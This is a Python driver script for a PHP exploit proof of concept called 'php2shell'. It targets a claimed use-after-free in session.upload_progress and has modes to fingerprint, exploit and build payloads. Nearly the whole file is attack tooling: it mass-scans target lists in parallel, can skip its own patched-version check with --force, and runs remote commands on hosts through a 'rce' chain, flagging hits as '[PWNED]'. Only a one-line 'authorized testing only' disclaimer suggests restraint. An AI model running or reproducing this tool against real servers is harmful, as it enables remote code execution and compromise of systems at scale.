#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-109618 / CVE-2026-109619 (php2shell) — modular exploit PoC

Default mode: exploit (stalled multipart trigger). Use only on systems you own
or are explicitly authorized to test.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from threading import Lock
from typing import Any

from php2shell_core import (
    CVE_IDS,
    FIX_VERSIONS,
    LAB_PROGRESS_PATH,
    Target,
    build_rce619_multipart,
    build_trigger_multipart,
    fingerprint_target,
    resolve_call_addr,
    run_exploit_619,
    run_trigger_618,
)
from php2shell_exploit import run_smart_exploit_618

CVE_LABEL = " / ".join(CVE_IDS)


class Col:
    RST = "\033[0m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    DIM = "\033[2m"


_use_color = False
_print_lock = Lock()


def enable_windows_vt() -> bool:
    """Enable ANSI colors in classic conhost / older cmd.exe (Windows 10+)."""
    if sys.platform != "win32":
        return True
    try:
        import ctypes

        kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
        handle = kernel32.GetStdHandle(-11)
        mode = ctypes.c_uint()
        if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            return False
        enable = 0x0004  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
        if kernel32.SetConsoleMode(handle, mode.value | enable):
            return True
    except Exception:
        pass
    return False


def init_use_color(*, no_color: bool, force_color: bool) -> bool:
    if os.environ.get("NO_COLOR") is not None:
        return False
    if no_color:
        return False
    if not sys.stdout.isatty():
        return False
    if force_color or os.environ.get("FORCE_COLOR"):
        if sys.platform == "win32":
            enable_windows_vt()
        return True
    if sys.platform == "win32":
        return enable_windows_vt()
    return True


def paint(s: str, c: str) -> str:
    return s if not _use_color else c + s + Col.RST


def log(msg: str) -> None:
    print(msg, flush=True)


def log_ok(msg: str) -> None:
    log(paint(msg, Col.GREEN))


def log_warn(msg: str) -> None:
    log(paint(msg, Col.YELLOW))


def log_fail(msg: str) -> None:
    log(paint(msg, Col.RED))


def log_info(msg: str) -> None:
    log(paint(msg, Col.CYAN))


def log_dim(msg: str) -> None:
    log(paint(msg, Col.DIM))


def banner() -> None:
    log(
        paint(
            f"\n  php2shell PoC — {CVE_LABEL}\n"
            "  session.upload_progress UAF (authorized testing only)\n",
            Col.CYAN,
        )
    )


def parse_int_hex(s: str) -> int:
    return int(s.strip(), 0)


def _parse_variants(spec: str) -> frozenset[str]:
    spec = (spec or "all").strip().lower()
    if spec in ("all", "smart", "default"):
        return frozenset({"stall", "micro", "inject"})
    parts = {p.strip() for p in spec.replace(",", " ").split() if p.strip()}
    allowed = {"stall", "micro", "inject"}
    bad = parts - allowed
    if bad:
        raise SystemExit(f"unknown --variant parts: {bad} (use stall,micro,inject,all)")
    return frozenset(parts) if parts else frozenset({"stall"})


def normalize_target_url(raw: str) -> str:
    s = raw.strip()
    if not s:
        return s
    if "://" not in s:
        s = "https://" + s
    return s


def load_targets(path: str) -> list[str]:
    lines = Path(path).read_text(encoding="utf-8", errors="replace").splitlines()
    out: list[str] = []
    skip_headers = {"domain", "host", "url", "target"}
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split(",")[0].split()[0].strip().lower()
        if token in skip_headers:
            continue
        out.append(normalize_target_url(line.split(",")[0].split()[0]))
    return out


def resolve_targets(args: argparse.Namespace) -> list[str]:
    targets: list[str] = []
    if args.file:
        targets.extend(load_targets(args.file))
    if args.url:
        targets.append(normalize_target_url(args.url))
    # dedupe, preserve order
    seen: set[str] = set()
    unique: list[str] = []
    for t in targets:
        if t and t not in seen:
            seen.add(t)
            unique.append(t)
    return unique


def classify_check(fp: dict[str, Any]) -> str:
    if not fp.get("http_status"):
        return "unreachable"
    if not fp.get("php_version"):
        return "no_php_version"
    if fp.get("php_patch_known") is False:
        return "branch_only"
    lv = fp.get("likely_vulnerable")
    if lv is True:
        return "likely_vulnerable"
    if lv is False:
        return "patched"
    return "eol_or_unknown"


def run_check(url: str, timeout: float) -> dict[str, Any]:
    target = Target.from_url(url)
    fp = fingerprint_target(target, timeout=timeout)
    fp["mode"] = "check"
    fp["input"] = url
    fp["status"] = classify_check(fp)
    return fp


def print_check_row(fp: dict[str, Any], *, verbose: bool = False) -> None:
    st = fp.get("status", "?")
    ver = fp.get("php_version") or "?"
    host = fp.get("input") or fp.get("target", "?")
    if st == "likely_vulnerable":
        log_warn(f"[{st}] {host} PHP {ver}")
    elif st == "branch_only":
        log_info(f"[{st}] {host} PHP {ver}")
    elif st == "patched":
        log_ok(f"[{st}] {host} PHP {ver}")
    elif st == "unreachable":
        log_fail(f"[{st}] {host}")
    else:
        log_info(f"[{st}] {host} PHP {ver}")
    if verbose:
        if fp.get("x_powered_by"):
            log_dim(f"    X-Powered-By: {fp['x_powered_by']}")
        if fp.get("server"):
            log_dim(f"    Server: {fp['server']}")


def append_jsonl(path: Path, row: dict[str, Any]) -> None:
    with _print_lock:
        with path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(row, default=str) + "\n")


def run_bulk_check(args: argparse.Namespace, targets: list[str]) -> int:
    workers = max(1, args.workers)
    total = len(targets)
    rows: list[dict[str, Any]] = [None] * total  # type: ignore[list-item]
    index = {url: i for i, url in enumerate(targets)}
    done = 0
    out_path: Path | None = None
    if args.output and total > 1:
        out_path = Path(args.output)
        out_path.write_text("", encoding="utf-8")

    compact = args.compact or total >= 25
    if not args.quiet and not args.json:
        log_dim(
            f"Bulk check: {total} targets, {workers} workers, timeout={args.timeout}s"
            + (" compact" if compact else "")
        )

    def _one(url: str) -> dict[str, Any]:
        if args.delay and workers == 1:
            time.sleep(args.delay)
        try:
            return run_check(url, args.timeout)
        except Exception as exc:
            return {
                "input": url,
                "mode": "check",
                "status": "error",
                "error": f"{type(exc).__name__}: {exc}",
                "http_status": 0,
            }

    def _report(row: dict[str, Any], n: int) -> None:
        if out_path:
            append_jsonl(out_path, row)
        if not args.quiet and not args.json:
            with _print_lock:
                if compact:
                    st = row.get("status", "?")
                    ver = row.get("php_version") or "?"
                    host = row.get("input") or row.get("target", "?")
                    log(f"[{n}/{total}] [{st}] {host} PHP {ver}")
                else:
                    log_dim(f"[{n}/{total}]")
                    print_check_row(row)

    if workers == 1:
        for i, url in enumerate(targets):
            row = _one(url)
            rows[i] = row
            done = i + 1
            _report(row, done)
    else:
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futs = {pool.submit(_one, url): url for url in targets}
            for fut in as_completed(futs):
                url = futs[fut]
                row = fut.result()
                rows[index[url]] = row
                done += 1
                _report(row, done)

    rows = [r for r in rows if r is not None]
    return finalize_bulk(args, rows, mode="check", skip_output=bool(out_path))


def finalize_bulk(
    args: argparse.Namespace,
    rows: list[dict[str, Any]],
    *,
    mode: str,
    skip_output: bool = False,
) -> int:
    if args.output and not skip_output:
        out = Path(args.output)
        if len(rows) == 1 and not str(out).endswith(".jsonl"):
            out.write_text(json.dumps(rows[0], indent=2, default=str) + "\n", encoding="utf-8")
        else:
            with out.open("w", encoding="utf-8") as fh:
                for row in rows:
                    fh.write(json.dumps(row, default=str) + "\n")

    if args.json:
        if len(rows) == 1:
            log(json.dumps(rows[0], indent=2, default=str))
        else:
            log(json.dumps(rows, indent=2, default=str))

    if not args.quiet and not args.json and len(rows) > 1:
        counts: dict[str, int] = {}
        for r in rows:
            key = r.get("status") or r.get("exploit_status") or "unknown"
            counts[key] = counts.get(key, 0) + 1
        parts = ", ".join(f"{k}={v}" for k, v in sorted(counts.items()))
        log_info(f"Summary ({len(rows)} targets): {parts}")

    exit_code = 0
    if mode == "check":
        if any(r.get("status") == "likely_vulnerable" for r in rows):
            exit_code = 2
        elif any(r.get("status") == "branch_only" for r in rows):
            exit_code = max(exit_code, 1)
        elif not rows or all(r.get("status") == "unreachable" for r in rows):
            exit_code = 1
    else:
        if any(r.get("success") for r in rows):
            exit_code = 0
        elif rows:
            exit_code = 1
    return exit_code


def cmd_check(args: argparse.Namespace) -> int:
    targets = resolve_targets(args)
    if len(targets) > 1 or args.file:
        return run_bulk_check(args, targets)
    if not targets:
        log_fail("provide URL or -f/--file")
        return 2

    fp = run_check(targets[0], args.timeout)
    if args.json:
        print(json.dumps(fp, indent=2))
        return 0 if fp.get("http_status") else 1

    print_check_row(fp, verbose=True)
    if len(targets) == 1:
        log_dim("Emergency fixes: " + ", ".join(f"{k} -> {'.'.join(map(str, v))}" for k, v in FIX_VERSIONS.items()))
        log_dim("Mitigation: session.upload_progress.enabled = Off")
    return 0 if fp.get("http_status") else 1


def print_exploit_detail(url: str, smart: dict[str, Any], quiet: bool) -> None:
    if quiet:
        return
    best = smart.get("best") or {}
    log_info(
        f"-- {url} best={smart.get('exploit_status')} score={smart.get('best_score')} "
        f"path={best.get('path')} variant={best.get('variant')} HTTP={best.get('status')}"
    )
    if smart.get("session_fixation_hits"):
        log_ok(f"    session fixation Set-Cookie × {smart['session_fixation_hits']}")
    if smart.get("armed"):
        log_ok(f"    upload_progress armed × {smart['armed']}")
    if smart.get("crashes"):
        log_warn(f"    worker crash signal × {smart['crashes']}")
    log_dim(f"    tried paths: {', '.join(smart.get('probe_paths') or [])}")


def run_exploit_for_url(args: argparse.Namespace, url: str) -> dict[str, Any]:
    target = Target.from_url(url)
    expect = args.expect.encode() if args.expect else None
    row: dict[str, Any] = {"input": url, "target": target.base() + target.path, "mode": "exploit", "success": False}
    body_hint = ""

    if not args.skip_fingerprint:
        fp = fingerprint_target(target, timeout=args.timeout)
        row["fingerprint"] = fp
        if fp.get("likely_vulnerable") is False and not args.force:
            row["exploit_status"] = "skipped_patched"
            row["error"] = f"PHP {fp.get('php_version')} looks patched"
            if not args.quiet:
                log_fail(f"{url}: {row['error']} (use --force)")
            return row
        if fp.get("php_version") and not args.quiet:
            log_dim(f"[fp] {url} PHP {fp['php_version']}")
        body_hint = (fp.get("x_powered_by") or "") + " " + (fp.get("server") or "")

    chain = args.chain.lower()
    if chain in ("618", "109618", "trigger"):
        variants = _parse_variants(args.variant)
        extra_paths = list(args.probe_path or [])

        if args.no_smart:
            results = run_trigger_618(
                target,
                stall=args.stall,
                monitor=args.monitor,
                progress_path=args.progress_url or LAB_PROGRESS_PATH,
                rounds=args.rounds,
                timeout=args.timeout,
            )
            armed = sum(1 for r in results if r.armed)
            crashes = sum(1 for r in results if r.crashed)
            row["rounds"] = len(results)
            row["armed"] = armed
            row["crashes"] = crashes
            if not args.quiet:
                for i, r in enumerate(results, 1):
                    log_info(f"-- {url} round {i}/{len(results)} SID={r.session_id}")
                    log_dim(f"    HTTP {r.status} {r.reason} path={r.path}")
                    if r.armed:
                        log_ok(f"    upload_progress armed (bytes_processed={r.bytes_processed})")
                    elif args.monitor:
                        log_warn("    monitor: no upload_progress key")
                    if r.session_fixation:
                        log_ok("    Set-Cookie session fixation")
                    if r.crashed:
                        log_warn("    worker may have crashed")
            if armed:
                row["success"] = True
                row["exploit_status"] = "armed"
                return row
            if crashes:
                row["exploit_status"] = "crash_signal"
                row["success"] = bool(args.force)
                return row
            if any(r.session_fixation for r in results):
                row["success"] = True
                row["exploit_status"] = "session_fixation"
                return row
            row["exploit_status"] = "inconclusive"
            return row

        smart = run_smart_exploit_618(
            target,
            stall=args.stall,
            monitor=args.monitor,
            progress_path=args.progress_url or LAB_PROGRESS_PATH,
            rounds=args.rounds,
            timeout=args.timeout,
            variants=variants,
            probe_paths=extra_paths if extra_paths else None,
            body_hint=body_hint,
            expect=expect,
            max_paths=args.max_paths,
        )
        row.update({k: smart[k] for k in ("success", "exploit_status", "best_score", "probe_paths", "attempts", "armed", "crashes", "session_fixation_hits") if k in smart})
        print_exploit_detail(url, smart, args.quiet)
        if row.get("success"):
            if row["exploit_status"] == "armed":
                log_ok(f"[PWNED?] {url} upload_progress path confirmed")
            elif row["exploit_status"] == "session_fixation":
                log_ok(f"[PRIMITIVE] {url} session fixation via POST PHPSESSID (upload_progress surface)")
            return row
        if row.get("exploit_status") == "crash_signal" and args.force:
            row["success"] = True
            return row
        if row.get("exploit_status") == "upload_accepted" and not args.quiet:
            log_warn(
                f"[WEAK-SIGNAL] {url} multipart reached PHP (HTTP ok) — not UAF proof; "
                "use lab --monitor or 619 with --call"
            )
        elif not args.quiet:
            log_warn(f"[INCONCLUSIVE] {url} — see attempts in JSON / -o")
        return row

    if chain in ("619", "109619", "rce"):
        call = resolve_call_addr(
            parse_int_hex(args.dtor) if args.dtor else None,
            parse_int_hex(args.call) if args.call else None,
        )
        if call <= 0:
            row["exploit_status"] = "bad_args"
            row["error"] = "109619 needs --call or --dtor"
            if not args.quiet:
                log_fail(row["error"])
            return row
        if args.dry_run:
            sid = args.session_id or "dryrun619"
            p1, p2, meta = build_rce619_multipart(sid, args.command.encode(), call)
            out = Path(args.output or "body-109619.bin")
            out.write_bytes(p1 + p2)
            log_ok(f"Wrote {out} ({meta['total_len']} bytes) call={meta['call_addr']}")
            row["success"] = True
            row["exploit_status"] = "dry_run"
            return row
        r = run_exploit_619(
            target,
            args.command,
            session_id=args.session_id,
            stall=args.stall,
            call_addr=call,
        )
        if not args.quiet:
            log_info(f"{url} SID={r.session_id} HTTP {r.status} {r.reason}")
        hit = (expect and expect in r.body) or (
            not expect
            and (b"uid=" in r.body or b"JACKALPOC" in args.command.encode() and b"JACKALPOC" in r.body)
        )
        if hit:
            row["success"] = True
            row["exploit_status"] = "rce_hit"
            if not args.quiet:
                log_ok(f"[PWNED] {url} command output likely in body")
                snippet = r.body[:400].decode("latin-1", "replace")
                log_dim(snippet)
            return row
        if r.crashed:
            row["exploit_status"] = "crash_signal"
            if not args.quiet:
                log_warn(f"[SIGNAL] {url} empty/502/503")
            return row
        row["exploit_status"] = "failed"
        if not args.quiet:
            log_fail(f"[FAIL] {url} no command marker (wrong offsets/build?)")
        return row

    row["exploit_status"] = "bad_chain"
    row["error"] = f"Unknown chain {args.chain!r}"
    if not args.quiet:
        log_fail(row["error"])
    return row


def run_bulk_exploit(args: argparse.Namespace, targets: list[str]) -> int:
    if args.dry_run and len(targets) > 1:
        log_fail("dry-run supports only one target")
        return 2
    workers = max(1, min(args.workers, 4 if args.monitor else args.workers))
    rows: list[dict[str, Any]] = []

    def _one(url: str) -> dict[str, Any]:
        if args.delay and workers == 1:
            time.sleep(args.delay)
        return run_exploit_for_url(args, url)

    if workers == 1:
        for i, url in enumerate(targets):
            if not args.quiet and len(targets) > 1:
                log_dim(f"--- ({i + 1}/{len(targets)}) {url} ---")
            rows.append(_one(url))
    else:
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futs = [pool.submit(_one, url) for url in targets]
            for fut in as_completed(futs):
                rows.append(fut.result())
    return finalize_bulk(args, rows, mode="exploit")


def cmd_exploit(args: argparse.Namespace) -> int:
    targets = resolve_targets(args)
    if args.file or len(targets) > 1:
        if not targets:
            log_fail("target file is empty")
            return 2
        return run_bulk_exploit(args, targets)
    if not targets:
        log_fail("provide URL or -f/--file")
        return 2
    row = run_exploit_for_url(args, targets[0])
    if args.output:
        Path(args.output).write_text(
            json.dumps(row, indent=2, default=str) + "\n",
            encoding="utf-8",
        )
        if not args.quiet:
            log_dim(f"Wrote {args.output}")
    if args.json:
        # attempts can be large; keep JSON usable
        out = dict(row)
        if isinstance(out.get("attempts"), list) and len(out["attempts"]) > 20:
            out["attempts_truncated"] = out["attempts"][:20]
            out["attempts"] = f"<{len(row['attempts'])} attempts; see -o or remove -q>"
        log(json.dumps(out, indent=2, default=str))
    if row.get("exploit_status") == "skipped_patched":
        return 2
    if row.get("exploit_status") == "bad_args":
        return 2
    if row.get("success"):
        return 0
    if row.get("exploit_status") == "crash_signal" and args.force:
        return 0
    return 1


def cmd_build(args: argparse.Namespace) -> int:
    """Offline multipart builder (no network)."""
    sid = args.session_id or "buildtest"
    if args.chain.startswith("619"):
        call = resolve_call_addr(
            parse_int_hex(args.dtor) if args.dtor else None,
            parse_int_hex(args.call) if args.call else None,
        )
        if call <= 0:
            log_fail("619 build requires --call or --dtor")
            return 2
        p1, p2, meta = build_rce619_multipart(sid, args.command.encode(), call)
    else:
        p1, p2, _, total = build_trigger_multipart(sid)
        meta = {"total_len": total, "chain": "618"}
    out = Path(args.output or "multipart-body.bin")
    out.write_bytes(p1 + p2)
    log_ok(f"Wrote {out} meta={meta}")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(
        description=f"php2shell modular PoC ({CVE_LABEL})",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python poc.py check https://127.0.0.1:19268/index.php
  python poc.py check -f targets.txt -o results.jsonl --workers 16
  python poc.py exploit http://127.0.0.1:19268/index.php --monitor
  python poc.py exploit https://target/  # default smart: multi-path + stall/micro/inject
  python poc.py exploit https://target/ --no-smart --variant stall
  python poc.py exploit -f targets.txt --chain 618 --workers 2 --delay 0.5
  python poc.py build --chain trigger -o body.bin
""",
    )
    ap.add_argument("mode", choices=("check", "exploit", "build"), nargs="?", default="exploit")
    ap.add_argument("url", nargs="?", default=None, help="Target URL (or use -f)")
    ap.add_argument("-f", "--file", help="Target list, one URL per line (# comments ok)")
    ap.add_argument(
        "--workers",
        type=int,
        default=8,
        help="Parallel hosts for bulk check/exploit (default: 8, exploit capped at 4 if --monitor)",
    )
    ap.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Seconds between targets when --workers 1",
    )
    ap.add_argument("--chain", default="618", help="618|trigger or 619|rce (default: 618 trigger)")
    ap.add_argument(
        "--no-smart",
        action="store_true",
        help="618: single URL path only, no multi-path / variant sweep",
    )
    ap.add_argument(
        "--variant",
        default="all",
        help="618 smart variants: all | stall | micro | inject | comma list",
    )
    ap.add_argument(
        "--probe-path",
        action="append",
        default=None,
        help="Extra POST path to try (repeatable), e.g. /index.php",
    )
    ap.add_argument("--max-paths", type=int, default=4, help="Max paths per host in smart mode")
    ap.add_argument("--stall", type=float, default=1.5, help="pause between upload phases (> min_freq)")
    ap.add_argument("--rounds", type=int, default=1)
    ap.add_argument("--monitor", action="store_true", help="read upload_progress during stall (lab endpoint)")
    ap.add_argument("--progress-url", default=None, help=f"path for monitor GET (default {LAB_PROGRESS_PATH})")
    ap.add_argument("--command", default="id", help="619 RCE command string")
    ap.add_argument("--call", default="", help="zend_call_function address (hex)")
    ap.add_argument("--dtor", default="", help="zval_ptr_dtor address; call = dtor - delta")
    ap.add_argument("--session-id", default=None)
    ap.add_argument("--expect", default="", help="substring that confirms success in response body")
    ap.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="TCP/HTTP read timeout per request (default: 10)",
    )
    ap.add_argument("--skip-fingerprint", action="store_true")
    ap.add_argument("--force", action="store_true", help="run even if fingerprint says patched")
    ap.add_argument("--dry-run", action="store_true", help="619: write body only, no HTTP")
    ap.add_argument("-o", "--output", default=None)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--no-color", action="store_true", help="Plain text (no ANSI)")
    ap.add_argument(
        "--color",
        action="store_true",
        help="Force ANSI colors (Windows: enables VT mode)",
    )
    ap.add_argument(
        "--compact",
        action="store_true",
        help="Bulk check: one line per host (no extra progress line)",
    )
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    global _use_color
    _use_color = init_use_color(no_color=args.no_color, force_color=args.color)

    if args.mode == "build" and not args.url and not args.file:
        args.url = "http://127.0.0.1:19268/index.php"

    banner()
    if args.mode == "check":
        return cmd_check(args)
    if args.mode == "build":
        if not args.url:
            log_fail("build requires a URL placeholder or use defaults via positional url")
        return cmd_build(args)
    if not args.url and not args.file:
        log_fail("provide URL or -f/--file")
        return 2
    return cmd_exploit(args)


if __name__ == "__main__":
    sys.exit(main())
